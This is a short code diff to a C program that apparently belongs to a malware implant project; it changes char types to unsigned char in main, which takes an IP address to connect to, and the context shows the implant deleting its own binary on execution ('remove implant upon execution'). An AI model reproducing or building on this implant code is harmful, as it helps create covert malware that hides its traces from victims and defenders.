@@ -7,13 +7,13 @@
 #include <sys/mman.h>
 #include "../include/implant.h"
 
-int main(int argc, char **argv) {
+int main(int argc, unsigned char **argv) {
     if (argc < 2) {
         fprintf(stderr, "Error: Specify the IP address to connect to as an argument\n");
         return 1;
     }
 
-    char *target = malloc(strlen(argv[1]) + 1);
+    unsigned char *target = malloc(strlen(argv[1]) + 1);
 
     // remove implant upon execution
     unlink(argv[0]);
